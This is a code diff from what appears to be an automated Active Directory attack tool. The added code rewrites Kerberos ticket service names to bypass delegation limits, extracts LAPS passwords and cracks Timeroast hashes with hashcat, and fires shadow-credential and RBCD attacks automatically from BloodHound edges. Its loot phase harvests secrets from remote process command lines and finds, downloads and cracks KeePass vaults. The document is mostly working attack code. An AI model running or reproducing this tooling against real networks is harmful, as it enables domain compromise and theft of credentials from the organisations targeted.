 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Kerberos TGS sname rewrite (tgssub-style — KCD protocol-transition bypass)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def rewrite_spn_in_ccache(ccache_in: Path, alt_spn: str,
+                          ccache_out: Path, cfg: Config) -> bool:
+    """Rewrite the outer 'server' (sname) of every credential in a Kerberos
+    .ccache. Equivalent to tgssub.py / impacket-getST -altservice.
+
+    Used after S4U2Proxy when the issued ticket has sname=HTTP/<ghost-spn>
+    (registered on a target machine via WriteSPN) but the SPN-target service
+    requires sname=HTTP/<real-host>. The TGS encrypted blob is left intact;
+    only the cred-table sname changes."""
+    if not ccache_in.exists():
+        log.error(f"Input ccache not found: {ccache_in}")
+        return False
+    if "/" not in alt_spn:
+        log.error(f"Alt-SPN must be 'service/host' (got {alt_spn!r})")
+        return False
+
+    # 1. Prefer tgssub.py if present (matches blog/PoC verbatim)
+    tgssub = find_tool("tgssub.py", paths=[TOOLS_DIR / "tgssub" / "tgssub.py"])
+    if tgssub:
+        cmd = tgssub.split() + ["-in", str(ccache_in),
+                                "-out", str(ccache_out),
+                                "-altservice", alt_spn]
+        result = run(cmd, cfg, timeout=60)
+        if result.returncode == 0 and ccache_out.exists():
+            ok(f"tgssub.py: rewrote sname → {alt_spn}")
+            return True
+        log.warning(f"tgssub.py failed (rc={result.returncode}), trying impacket inline")
+
+    # 2. Fallback: impacket CCache module (system pkg python3-impacket)
+    try:
+        from impacket.krb5.ccache import CCache
+        from impacket.krb5.types import Principal
+        from impacket.krb5 import constants
+    except ImportError:
+        log.error("impacket not importable — cannot rewrite ccache")
+        return False
+
+    if cfg.dry_run:
+        print(f"{C.YELLOW}  [DRY RUN] rewrite ccache {ccache_in.name} → sname={alt_spn}{C.NC}")
+        return True
+
+    try:
+        ccache = CCache.loadFile(str(ccache_in))
+        new_principal = Principal(
+            alt_spn,
+            type=constants.PrincipalNameType.NT_SRV_INST.value,
+        )
+        # types.Principal() doesn't auto-populate .realm — fromPrincipal()
+        # then crashes deserializing it. Borrow the realm from the existing
+        # ccache cred (which is the correct realm for this ticket anyway).
+        # cred['server'] is a ccache.Principal; .realm is a CountedOctetString
+        # whose ['data'] field holds the bytes.
+        for cred in ccache.credentials:
+            existing_realm = cred["server"].realm["data"]
+            if isinstance(existing_realm, bytes):
+                existing_realm = existing_realm.decode(errors="replace")
+            new_principal.realm = existing_realm
+            cred["server"].fromPrincipal(new_principal)
+        ccache.saveFile(str(ccache_out))
+    except Exception as e:
+        log.error(f"impacket ccache rewrite failed: {e}")
+        return False
+
+    ok(f"impacket inline: rewrote sname → {alt_spn} ({ccache_out.name})")
+    return True
+
+
+def run_tgs_rewrite_phase(cfg: Config) -> bool:
+    """Standalone --phase tgs-rewrite: rewrite a ccache's sname out-of-band."""
+    phase_header("TGS SPN REWRITE (KCD protocol-transition bypass)")
+
+    if not cfg.in_ccache:
+        log.error("--phase tgs-rewrite needs --in-ccache <path>")
+        return False
+    if not cfg.alt_spn:
+        log.error("--phase tgs-rewrite needs --alt-spn <service/host>")
+        return False
+
+    in_path = Path(cfg.in_ccache)
+    out_path = cfg.work_dir / f"{in_path.stem}-rewritten.ccache"
+    if rewrite_spn_in_ccache(in_path, cfg.alt_spn, out_path, cfg):
+        success_box(f"Rewritten ccache: {out_path}")
+        detail(f"export KRB5CCNAME={out_path}")
+        detail(f"evil-winrm -i <host> -r {cfg.domain}")
+        return True
+    return False
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # RBCD (Resource-Based Constrained Delegation) Abuse
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -5291,10 +5942,12 @@ def _s4u2proxy(target: str, machine_name: str, machine_pass: str,
     ccache_path = cfg.work_dir / f"rbcd-{target}.ccache"
     log.info(f"S4U2Proxy: impersonating administrator on {target}...")
 
-    # Clean target name (remove domain suffix if present)
-    target_spn = target
+    # Clean target name → SPN-friendly FQDN.
+    # If we got a sAMAccountName like "HOST$", strip the trailing $ before
+    # appending the domain — SPNs use the host's DNS name, not the SAM name.
+    target_spn = target.rstrip("$")
     if "." not in target_spn and cfg.domain:
-        target_spn = f"{target}.{cfg.domain}"
+        target_spn = f"{target_spn}.{cfg.domain}"
 
     cmd = [
         "impacket-getST",
@@ -5303,6 +5956,11 @@ def _s4u2proxy(target: str, machine_name: str, machine_pass: str,
         f"{cfg.domain}/{machine_name}:{machine_pass}",
         "-dc-ip", cfg.dc_ip,
     ]
+    # Optional: rewrite the issued ticket's sname (KCD protocol-transition
+    # bypass — same effect as tgssub.py post-process)
+    if cfg.alt_spn:
+        cmd += ["-altservice", cfg.alt_spn]
+        log.info(f"S4U2Proxy: -altservice {cfg.alt_spn} (KCD bypass)")
 
     result = run(cmd, cfg, timeout=120)
     output = (result.stdout or "") + (result.stderr or "")
@@ -5746,6 +6404,858 @@ def run_nxc_enrichment(cfg: Config):
 
     ok(f"nxc enrichment done — full output in {cfg.work_dir}/nxc-*.txt")
 
+    # Now extract anything actionable from the module outputs
+    consume_nxc_findings(cfg)
+
+
+def consume_nxc_findings(cfg: Config):
+    """Parse the nxc enrichment outputs for actionable findings:
+
+      laps             → host:laps_password pairs (write enrich-laps.txt)
+      timeroast        → SNTP-MS hashes → auto-crack with hashcat -m 31300
+      get-userPassword → user:password from the LDAP userPassword attribute
+      get-desc-users   → user descriptions that *look* like they leak a password
+      pre2k            → write parsed machine names (used by _pre2k_autotest too)
+      maq              → record MachineAccountQuota
+      nopac/zerologon  → flag if not patched
+      backup_operator  → flag if exploitation succeeded
+      badsuccessor     → flag if dMSA objects exist
+
+    Consolidated extracted creds go to enrich-extracted-creds.txt. Vuln
+    flags + values go to enrich-summary.txt."""
+    extracted_creds: list[str] = []
+    summary_lines: list[str] = []
+
+    def _read(name: str) -> str:
+        f = cfg.work_dir / f"nxc-{name}.txt"
+        return f.read_text(errors="replace") if f.exists() else ""
+
+    # --- LAPS: lines like "LAPS ... HOST: <password>" or "[+] HOST$: <pass>"
+    laps_text = _read("laps")
+    laps_pairs: list[tuple[str, str]] = []
+    for line in laps_text.splitlines():
+        m = re.search(r"\bLAPS\b.*?\s([A-Za-z0-9-]+\$?)\s*:\s*(\S{8,})", line)
+        if m and "ms-MCS-AdmPwd" not in line and "msLAPS-Password" not in line:
+            host, pw = m.group(1), m.group(2)
+            if pw not in {"None", "null"}:
+                laps_pairs.append((host, pw))
+    if laps_pairs:
+        ok(f"💎 LAPS passwords recovered: {len(laps_pairs)}")
+        laps_file = cfg.work_dir / "enrich-laps.txt"
+        laps_file.write_text("\n".join(f"{h}\t{p}" for h, p in laps_pairs) + "\n")
+        for h, p in laps_pairs[:5]:
+            detail(f"{h} → {p}")
+            extracted_creds.append(f"{h}:{p}")
+
+    # --- timeroast: lines like "TIMEROAST ... <rid>:$sntp-ms$<hash>"
+    timeroast_text = _read("timeroast")
+    sntp_hashes: list[str] = []
+    for line in timeroast_text.splitlines():
+        m = re.search(r"(\d+:\$sntp-ms\$[a-f0-9]+)", line, re.I)
+        if m:
+            sntp_hashes.append(m.group(1))
+    if sntp_hashes:
+        ok(f"⏰ Timeroast hashes captured: {len(sntp_hashes)}")
+        hash_file = cfg.work_dir / "enrich-timeroast-hashes.txt"
+        hash_file.write_text("\n".join(sntp_hashes) + "\n")
+        # Try to crack — SNTP-MS is hashcat mode 31300
+        wordlist: Optional[Path] = None
+        for wl in WORDLISTS:
+            if wl.exists() and wl.suffix != ".gz":
+                wordlist = wl
+                break
+            if wl.suffix == ".gz" and wl.exists():
+                plain = wl.with_suffix("")
+                if plain.exists():
+                    wordlist = plain
+                    break
+        if wordlist and tool_exists("hashcat"):
+            cracked = cfg.work_dir / "enrich-timeroast-cracked.txt"
+            log.info(f"⚙️  hashcat -m 31300 on {len(sntp_hashes)} timeroast hash(es) (cap 120s)")
+            run(["hashcat", "-m", "31300", str(hash_file), str(wordlist),
+                 "--outfile", str(cracked), "--outfile-format=2",
+                 "--quiet", "--runtime=120"], cfg, timeout=180)
+            if cracked.exists() and cracked.stat().st_size > 0:
+                cracked_pwds = [ln for ln in cracked.read_text().splitlines() if ln.strip()]
+                ok(f"💎 Timeroast cracked: {len(cracked_pwds)} machine password(s)")
+                for p in cracked_pwds[:5]:
+                    detail(p)
+                    extracted_creds.append(f"machine_acct:{p}")
+
+    # --- get-userPassword: "[+] User: alice  userPassword: P@ss"
+    upw_text = _read("get-userPassword")
+    for line in upw_text.splitlines():
+        m = re.search(r"User:\s*(\S+).*?userPassword:\s*(\S+)", line)
+        if m:
+            user, pw = m.group(1), m.group(2)
+            ok(f"💎 LDAP userPassword: {user} → {pw}")
+            extracted_creds.append(f"{user}:{pw}")
+
+    # --- get-desc-users: "[+] user (description=...)" — flag descs containing
+    # password-like substrings (4+ chars, at least one digit/symbol)
+    desc_text = _read("get-desc-users")
+    desc_hits: list[str] = []
+    for line in desc_text.splitlines():
+        m = re.search(r"User:\s*(\S+)\s+description:\s*(.+)$", line)
+        if not m:
+            continue
+        user, desc = m.group(1), m.group(2).strip()
+        if re.search(r"(?i)(pass|pwd|secret|cred|login)\W*[:= ]\W*\S{4,}", desc):
+            desc_hits.append(f"{user}\t{desc}")
+            ok(f"💎 Description-leaked password? {user}: {desc[:80]}")
+            extracted_creds.append(f"{user}:?  (description: {desc[:80]})")
+    if desc_hits:
+        (cfg.work_dir / "enrich-descs.txt").write_text("\n".join(desc_hits) + "\n")
+
+    # --- pre2k: parse machine names (already used by _pre2k_autotest, but
+    # surface here too so an operator can see them in the summary)
+    pre2k_text = _read("pre2k")
+    pre2k_machines: list[str] = []
+    for line in pre2k_text.splitlines():
+        m = re.search(r"\b([A-Za-z][A-Za-z0-9_-]+\$)\b", line)
+        if m and "PRE2K" in line.upper():
+            pre2k_machines.append(m.group(1))
+    if pre2k_machines:
+        pre2k_machines = list(dict.fromkeys(pre2k_machines))
+        ok(f"📌 pre2k machine accounts: {len(pre2k_machines)}")
+        (cfg.work_dir / "enrich-pre2k.txt").write_text("\n".join(pre2k_machines) + "\n")
+
+    # --- maq value
+    maq_text = _read("maq")
+    m = re.search(r"MachineAccountQuota:\s*(\d+)", maq_text)
+    if m:
+        maq = int(m.group(1))
+        if maq > 0:
+            summary_lines.append(f"MAQ-RBCD-VIABLE: MachineAccountQuota = {maq}")
+            detail(f"MAQ={maq} — RBCD machine-account creation viable")
+        else:
+            summary_lines.append(f"MachineAccountQuota = 0 (RBCD path closed)")
+
+    # --- nopac (CVE-2021-42278/42287)
+    if "VULNERABLE" in _read("nopac").upper() or "NOPAC IS VULNERABLE" in _read("nopac").upper():
+        ok("🔥 noPac (CVE-2021-42278/42287) appears VULNERABLE")
+        summary_lines.append("noPac: VULNERABLE")
+
+    # --- zerologon (CVE-2020-1472): "Attack failed" in patched, "VULNERABLE" otherwise
+    zl = _read("zerologon")
+    if "VULNERABLE" in zl.upper() or ("succe" in zl.lower() and "fail" not in zl.lower()):
+        ok("🔥 Zerologon (CVE-2020-1472) appears VULNERABLE")
+        summary_lines.append("Zerologon: VULNERABLE")
+
+    # --- backup_operator: "[+] DC compromised" / "saved as" success markers
+    bo = _read("backup_operator")
+    if re.search(r"saved as|DC compromised|secrets dumped", bo, re.I):
+        ok("🔥 Backup Operators DRSR escalation appears successful")
+        summary_lines.append("backup_operator: PRIV-ESC achieved")
+
+    # --- badsuccessor: dMSA objects present
+    bs = _read("badsuccessor")
+    if "found" in bs.lower() and re.search(r"\bdMSA\b|results", bs, re.I):
+        m = re.search(r"Found\s+(\d+)\s+result", bs)
+        n = int(m.group(1)) if m else 1
+        ok(f"🔥 badsuccessor: {n} dMSA object(s) (BadSuccessor 2024 vuln applicable)")
+        summary_lines.append(f"badsuccessor: {n} dMSA object(s)")
+
+    # Persist consolidated outputs
+    if extracted_creds:
+        creds_file = cfg.work_dir / "enrich-extracted-creds.txt"
+        creds_file.write_text("\n".join(extracted_creds) + "\n")
+        ok(f"📝 nxc enrichment yielded {len(extracted_creds)} credential leak(s) → {creds_file.name}")
+    if summary_lines:
+        (cfg.work_dir / "enrich-summary.txt").write_text("\n".join(summary_lines) + "\n")
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# BloodHound — graph collection (-c All) + automatic analysis
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def run_bloodhound_collect(cfg: Config) -> bool:
+    """Collect AD graph data with bloodhound-python (-c All --zip), then
+    parse the resulting JSON files for high-value findings.
+
+    Equivalent to:
+      bloodhound-python -c All -u USER -p PASS -d DOMAIN \\
+                        -dc DC.FQDN -ns DC_IP --zip
+    """
+    if not tool_exists("bloodhound-python"):
+        log.warning("bloodhound-python not available — skipping BloodHound collection")
+        return False
+    if not cfg.has_creds:
+        log.warning("BloodHound is post-auth — skipping (no creds)")
+        return False
+    if not (cfg.domain and cfg.dc_fqdn and cfg.dc_ip):
+        log.warning("BloodHound needs domain + dc-fqdn + dc-ip — skipping")
+        return False
+
+    phase_header("BLOODHOUND COLLECTION + ANALYSIS")
+
+    bh_dir = cfg.work_dir / "bloodhound"
+    bh_dir.mkdir(exist_ok=True)
+
+    cmd = ["bloodhound-python", "-c", "All",
+           "-u", cfg.username,
+           "-d", cfg.domain,
+           "-dc", cfg.dc_fqdn,
+           "-ns", cfg.dc_ip,
+           "--zip"]
+    if cfg.nthash:
+        cmd += ["--hashes", f":{cfg.nthash}"]
+    elif cfg.password:
+        cmd += ["-p", cfg.password]
+
+    log.info(f"🐶 bloodhound-python -c All against {cfg.dc_fqdn} ({cfg.dc_ip})")
+    out_file = bh_dir / "collect.log"
+
+    # bloodhound-python writes ZIP/JSON into the current working directory
+    prev_cwd = os.getcwd()
+    try:
+        os.chdir(bh_dir)
+        result = run(cmd, cfg, timeout=900, outfile=out_file)
+    finally:
+        os.chdir(prev_cwd)
+
+    if cfg.dry_run:
+        return True
+
+    if result.returncode != 0:
+        log.warning(f"bloodhound-python rc={result.returncode} — see {out_file}")
+
+    zip_files = sorted(bh_dir.glob("*bloodhound.zip"),
+                       key=lambda p: p.stat().st_mtime, reverse=True)
+    if not zip_files:
+        zip_files = sorted(bh_dir.glob("*.zip"),
+                           key=lambda p: p.stat().st_mtime, reverse=True)
+
+    analysis: dict = {}
+    if zip_files:
+        ok(f"BloodHound data collected: {zip_files[0].name}")
+        analysis = analyze_bloodhound_data(zip_files[0], cfg)
+    else:
+        # bloodhound-python may have written raw JSON without zipping
+        json_files = list(bh_dir.glob("*_users.json"))
+        if json_files:
+            ok("BloodHound JSON files written (no zip)")
+            analysis = analyze_bloodhound_data(None, cfg, json_dir=bh_dir)
+        else:
+            log.warning("BloodHound produced no output — collection failed")
+            return False
+
+    # Opportunistic chains: walk actionable edges and fire matching primitives
+    if not cfg.no_bh_auto_action:
+        _bh_auto_action(analysis.get("actionable_edges", []), cfg)
+    return True
+
+
+def _bh_auto_action(edges: list[dict], cfg: Config):
+    """Fire opportunistic attack chains for each actionable BloodHound edge.
+
+    Maps edge (right, target_type) → primitive:
+      WriteSPN              → try_ghost_spn_upgrade   (CVE-2025-58726-style)
+      AddKeyCredentialLink  → run_shadow_credentials  (PKINIT pre-auth)
+      GenericAll/Write* on Computer → run_rbcd_attack (RBCD impersonation)
+
+    De-duplicates by (action, target) so the same target isn't hit twice.
+    Caps total auto-actions to avoid runaway chains."""
+    if not edges:
+        return
+
+    fired: set[tuple[str, str]] = set()
+    cap = 8  # safety net — don't burn the whole run on graph chasing
+
+    phase_header("BLOODHOUND OPPORTUNISTIC CHAINS")
+
+    for e in edges:
+        if len(fired) >= cap:
+            log.info(f"Auto-action cap ({cap}) reached — stopping (use --no-bh-auto-action to disable)")
+            break
+
+        action = _BH_AUTO_ACTION_MAP.get((e["right"], e["target_type"]))
+        if not action:
+            continue
+
+        sam = _bh_name_to_sam(e["target_name"], e["target_type"])
+        key = (action, sam)
+        if key in fired:
+            continue
+        fired.add(key)
+
+        log.info(f"⚡ {action} ← {e['right']} on {e['target_type']}:{e['target_name']} (sam={sam})")
+        try:
+            if action == "ghost_spn":
+                try_ghost_spn_upgrade(sam, cfg)
+            elif action == "shadow_creds":
+                run_shadow_credentials(sam, cfg)
+            elif action == "rbcd":
+                run_rbcd_attack(sam, cfg)
+        except Exception as ex:
+            log.warning(f"Auto-action {action} on {sam} crashed: {ex}")
+
+    if fired:
+        ok(f"Auto-action: {len(fired)} chain(s) attempted from BloodHound edges")
+    else:
+        detail("No matching auto-action edges (ACE rights present but not on actionable target type)")
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Loot — process command-line harvest + KeePass vault discovery/crack
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Patterns that suggest secrets in process command-lines. Tight enough that
+# the noise floor stays low on a real workstation; loose enough to catch
+# runas, sqlcmd, mysql, KeePass and arbitrary "/p:" style flags.
+_LOOT_SECRET_PATTERNS = [
+    re.compile(r"\s-p\s*\S{3,}", re.I),                # -p<pass> / -p <pass>
+    re.compile(r"--password[= ]\S+", re.I),
+    re.compile(r"/p(?:wd|assword)?[: =]\S+", re.I),    # /p:foo, /pwd:foo, /password=foo
+    re.compile(r"\bpass(?:word)?[: =]\S+", re.I),
+    re.compile(r"\b(?:secret|token|apikey|api_key)[: =]\S+", re.I),
+    re.compile(r"runas\s+/user[: =]\S+", re.I),
+    re.compile(r"-pw[: ]\S+", re.I),                   # KeePass -pw:
+]
+
+
+def _loot_get_targets(cfg: Config) -> list[str]:
+    """Pick up to 10 hosts to loot. Priority: explicit target → exploit-succeeded
+    hosts (working-method-*.txt) → high-value targets → relay targets."""
+    if cfg.specific_target:
+        return [cfg.specific_target]
+    targets: list[str] = []
+    for f in cfg.work_dir.glob("working-method-*.txt"):
+        targets.append(f.stem.replace("working-method-", ""))
+    if not targets:
+        hv = cfg.work_dir / "high-value-targets.txt"
+        if hv.exists():
+            targets.extend([l.strip() for l in hv.read_text().splitlines() if l.strip()])
+    if not targets:
+        rt = cfg.work_dir / "relay-targets.txt"
+        if rt.exists():
+            targets.extend([l.strip() for l in rt.read_text().splitlines() if l.strip()])
+    seen: set[str] = set()
+    out: list[str] = []
+    for t in targets:
+        if t and t not in seen:
+            seen.add(t)
+            out.append(t)
+    return out[:10]
+
+
+def _loot_processes(host: str, cfg: Config) -> int:
+    """Run Get-CimInstance Win32_Process via nxc -x and grep for secrets in
+    command-lines. Returns number of secret-pattern hits."""
+    if not tool_exists("nxc"):
+        return 0
+    out_file = cfg.work_dir / f"loot-procs-{host}.txt"
+    auth = _nxc_auth_args(cfg)
+    ps_cmd = (
+        "Get-CimInstance Win32_Process | "
+        "Select-Object Name,CommandLine | "
+        "Format-Table -AutoSize | Out-String -Width 4096"
+    )
+    cmd = ["nxc", "smb", host] + auth + ["-x", f'powershell -NoP -C "{ps_cmd}"']
+    log.info(f"💰 cmdline harvest on {host}")
+    result = run(cmd, cfg, timeout=120, outfile=out_file)
+    if result.returncode != 0 or not out_file.exists():
+        return 0
+
+    text = out_file.read_text(errors="replace")
+    hits: list[str] = []
+    for line in text.splitlines():
+        if not line.strip() or line.lstrip().startswith(("Name ", "----", "[*]", "[+]", "[-]")):
+            continue
+        for pat in _LOOT_SECRET_PATTERNS:
+            if pat.search(line):
+                hits.append(line.strip())
+                break
+    if hits:
+        secrets_file = cfg.work_dir / f"loot-secrets-{host}.txt"
+        secrets_file.write_text("\n".join(hits) + "\n")
+        ok(f"💰 Cmdline secrets on {host}: {len(hits)} hit(s)")
+        for h in hits[:5]:
+            detail(h[:200])
+    return len(hits)
+
+
+def _smb_get_file(host: str, remote_path: str, local_path: Path, cfg: Config) -> bool:
+    """Pull a file from a remote host's admin share via smbclient.
+    remote_path: 'C:\\Users\\foo\\db.kdbx' → fetched from C$ share."""
+    if not tool_exists("smbclient"):
+        return False
+
+    rel = remote_path.strip().strip('"').strip("'")
+    drive_match = re.match(r"^([A-Z]):\\(.*)$", rel, re.I)
+    if drive_match:
+        share = f"{drive_match.group(1).upper()}$"
+        rel = drive_match.group(2)
+    else:
+        share = "C$"
+    rel = rel.replace("/", "\\")
+
+    if cfg.password:
+        auth = ["-U", f"{cfg.domain}/{cfg.username}%{cfg.password}"]
+    elif cfg.nthash:
+        auth = ["-U", f"{cfg.domain}/{cfg.username}", "--pw-nt-hash"]
+    else:
+        return False
+
+    cmd = ["smbclient", f"//{host}/{share}"] + auth + [
+        "-c", f'get "{rel}" "{local_path}"',
+    ]
+    result = run(cmd, cfg, timeout=180)
+    return (result.returncode == 0
+            and local_path.exists()
+            and local_path.stat().st_size > 0)
+
+
+def _crack_kdbx(kdbx: Path, cfg: Config) -> bool:
+    """keepass2john + hashcat 13400 against a downloaded .kdbx."""
+    if not tool_exists("keepass2john"):
+        log.debug("keepass2john missing — apt install john")
+        return False
+    hash_file = kdbx.with_suffix(".kdbx.hash")
+    result = run(["keepass2john", str(kdbx)], cfg, timeout=60)
+    if result.returncode != 0 or not (result.stdout or "").strip():
+        log.debug(f"keepass2john produced no hash for {kdbx.name}")
+        return False
+    hash_file.write_text(result.stdout)
+
+    wordlist: Optional[Path] = None
+    for wl in WORDLISTS:
+        if wl.exists() and wl.suffix != ".gz":
+            wordlist = wl
+            break
+        if wl.suffix == ".gz" and wl.exists():
+            plain = wl.with_suffix("")
+            if plain.exists():
+                wordlist = plain
+                break
+            run(["gunzip", "-k", str(wl)], cfg)
+            if plain.exists():
+                wordlist = plain
+                break
+    if not wordlist:
+        log.warning(f"No wordlist for KeePass crack of {kdbx.name}")
+        return False
+    if not tool_exists("hashcat"):
+        return False
+
+    cracked_file = kdbx.with_suffix(".kdbx.cracked")
+    log.info(f"⚙️  hashcat -m 13400 on {kdbx.name} (cap 120s)")
+    run(
+        ["hashcat", "-m", "13400", str(hash_file), str(wordlist),
+         "--outfile", str(cracked_file), "--outfile-format=2",
+         "--quiet", "--runtime=120"],
+        cfg, timeout=180,
+    )
+    if cracked_file.exists() and cracked_file.stat().st_size > 0:
+        pwd = _first_line(cracked_file.read_text())
+        success_box(f"💎 KeePass cracked: {kdbx.name}")
+        detail(f"Master password: {pwd}")
+        return True
+    detail(f"KeePass {kdbx.name} not cracked with current wordlist")
+    return False
+
+
+def _loot_keepass(host: str, cfg: Config) -> int:
+    """Discover *.kdbx in C:\\Users, download via SMB, crack with keepass2john+hashcat."""
+    if not tool_exists("nxc"):
+        return 0
+    list_file = cfg.work_dir / f"loot-keepass-list-{host}.txt"
+    auth = _nxc_auth_args(cfg)
+    ps_cmd = (
+        "Get-ChildItem -Path C:\\Users -Recurse -Include *.kdbx "
+        "-ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
+    )
+    cmd = ["nxc", "smb", host] + auth + ["-x", f'powershell -NoP -C "{ps_cmd}"']
+    log.info(f"💰 KeePass discovery on {host}")
+    result = run(cmd, cfg, timeout=180, outfile=list_file)
+    if result.returncode != 0 or not list_file.exists():
+        return 0
+
+    raw = list_file.read_text(errors="replace")
+    paths: list[str] = []
+    for ln in raw.splitlines():
+        m = re.search(r"([A-Z]:\\\S.*\.kdbx)", ln, re.I)
+        if m:
+            paths.append(m.group(1))
+    paths = list(dict.fromkeys(paths))  # dedupe preserving order
+    if not paths:
+        detail(f"No KeePass vaults found on {host}")
+        return 0
+
+    ok(f"💰 KeePass vaults on {host}: {len(paths)}")
+    cracked_count = 0
+    for rpath in paths[:5]:
+        local = cfg.work_dir / f"loot-{host}-{Path(rpath).name}"
+        if _smb_get_file(host, rpath, local, cfg):
+            ok(f"📥 Downloaded {rpath} → {local.name}")
+            if _crack_kdbx(local, cfg):
+                cracked_count += 1
+        else:
+            detail(f"Could not download {rpath} (no admin on share?)")
+    return cracked_count
+
+
+def run_loot(cfg: Config) -> bool:
+    """Loot phase: process-cmdline harvest + KeePass discovery/crack across
+    compromised / high-value / relay-target hosts."""
+    phase_header("LOOT — process cmdlines + KeePass vaults")
+
+    if not cfg.has_creds:
+        log.warning("Loot phase needs creds — skipping")
+        return False
+
+    targets = _loot_get_targets(cfg)
+    if not targets:
+        log.warning("No loot targets (no compromised/HV/relay-target hosts known yet)")
+        return False
+
+    log.info(f"Looting {len(targets)} host(s): {', '.join(targets[:5])}"
+             + ("..." if len(targets) > 5 else ""))
+
+    total_secrets = 0
+    total_kdbx = 0
+    for host in targets:
+        try:
+            total_secrets += _loot_processes(host, cfg)
+            total_kdbx += _loot_keepass(host, cfg)
+        except Exception as ex:
+            log.warning(f"Loot crashed on {host}: {ex}")
+
+    if total_secrets or total_kdbx:
+        ok(f"Loot summary: {total_secrets} cmdline secret(s), {total_kdbx} KeePass cracked")
+        return True
+    detail("Loot: no secrets harvested")
+    return False
+
+
+def _bh_load_json(json_dir: Path, suffix: str) -> list[dict]:
+    """Load all *_<suffix>.json files in json_dir and return concatenated 'data' arrays."""
+    items: list[dict] = []
+    for jf in json_dir.glob(f"*_{suffix}.json"):
+        try:
+            doc = json.loads(jf.read_text(errors="replace"))
+            items.extend(doc.get("data", []))
+        except Exception as e:
+            log.debug(f"BloodHound JSON parse failed for {jf.name}: {e}")
+    return items
+
+
+def _bh_find_our_sid(users: list[dict], cfg: Config) -> str:
+    """Locate our own user object's SID from the BloodHound dataset."""
+    if not (cfg.username and cfg.domain):
+        return ""
+    target = f"{cfg.username.upper()}@{cfg.domain.upper()}"
+    for u in users:
+        if u.get("Properties", {}).get("name", "").upper() == target:
+            return u.get("ObjectIdentifier", "")
+    return ""
+
+
+def _bh_controlled_principals(start_sid: str, groups: list[dict]) -> set[str]:
+    """Compute the set of principal SIDs we control: our own SID plus
+    every group transitively containing us. Includes the well-known
+    universal-membership SIDs because edges scoped to those apply to us."""
+    controlled: set[str] = set()
+    if start_sid:
+        controlled.add(start_sid)
+    # Universal/built-in groups that always include any authenticated user
+    controlled.update({
+        "S-1-5-11",          # Authenticated Users
+        "S-1-5-32-545",      # BUILTIN\Users
+        "S-1-1-0",           # Everyone
+    })
+
+    # BFS over groups: add a group if any current member is controlled
+    changed = True
+    while changed:
+        changed = False
+        for g in groups:
+            gsid = g.get("ObjectIdentifier", "")
+            if not gsid or gsid in controlled:
+                continue
+            for m in g.get("Members", []):
+                if m.get("ObjectIdentifier", "") in controlled:
+                    controlled.add(gsid)
+                    changed = True
+                    break
+    return controlled
+
+
+def _bh_name_to_sam(bh_name: str, obj_type: str) -> str:
+    """Convert a BloodHound 'name' field to a usable AD identifier.
+
+    Computer objects: HOST.DOMAIN.LAB → HOST$
+    User/Group:       PRINCIPAL@DOMAIN.LAB → PRINCIPAL
+    """
+    if obj_type == "Computer":
+        first = bh_name.split(".", 1)[0]
+        if not first.endswith("$"):
+            first = f"{first}$"
+        return first
+    if "@" in bh_name:
+        return bh_name.split("@", 1)[0]
+    return bh_name
+
+
+# ACE rights that grant us a usable primitive against the target
+_BH_INTERESTING_RIGHTS = {
+    "WriteSPN", "AddKeyCredentialLink", "GenericAll", "GenericWrite",
+    "WriteDacl", "WriteOwner", "WriteAccountRestrictions", "AddAllowedToAct",
+    "ForceChangePassword", "AllExtendedRights", "Owns",
+}
+
+# (right, target_object_type) → action handler used by auto-action below
+_BH_AUTO_ACTION_MAP: dict[tuple[str, str], str] = {
+    ("WriteSPN",                   "Computer"): "ghost_spn",
+    ("WriteSPN",                   "User"):     "ghost_spn",
+    ("AddKeyCredentialLink",       "Computer"): "shadow_creds",
+    ("AddKeyCredentialLink",       "User"):     "shadow_creds",
+    ("GenericAll",                 "Computer"): "rbcd",
+    ("GenericWrite",               "Computer"): "rbcd",
+    ("WriteAccountRestrictions",   "Computer"): "rbcd",
+    ("AddAllowedToAct",            "Computer"): "rbcd",
+}
+
+
+def analyze_bloodhound_data(zip_path: Optional[Path], cfg: Config,
+                             json_dir: Optional[Path] = None) -> dict:
+    """Parse BloodHound JSON for high-value findings + actionable ACE edges.
+    Returns a dict with 'findings' (counts) and 'actionable_edges' (list
+    of dicts: {right, target_name, target_type, target_sid}).
+
+    The actionable-edges list is consumed by run_bloodhound_collect to
+    fire opportunistic ghost-SPN / shadow-creds / RBCD chains."""
+    if json_dir is None:
+        json_dir = cfg.work_dir / "bloodhound" / "json"
+        json_dir.mkdir(parents=True, exist_ok=True)
+        try:
+            with zipfile.ZipFile(zip_path) as zf:
+                zf.extractall(json_dir)
+        except Exception as e:
+            log.warning(f"Failed to extract BloodHound ZIP: {e}")
+            return {"findings": {}, "actionable_edges": []}
+
+    users = _bh_load_json(json_dir, "users")
+    computers = _bh_load_json(json_dir, "computers")
+    groups = _bh_load_json(json_dir, "groups")
+
+    log.info(f"BloodHound dataset: {len(users)} users, "
+             f"{len(computers)} computers, {len(groups)} groups")
+
+    # Build SID → name lookup so group memberships resolve to readable names
+    sid_to_name: dict[str, str] = {}
+    for collection in (users, computers, groups):
+        for obj in collection:
+            sid = obj.get("ObjectIdentifier", "")
+            name = obj.get("Properties", {}).get("name", "")
+            if sid and name:
+                sid_to_name[sid] = name
+
+    findings: dict[str, list[str]] = {
+        "domain_admins": [],
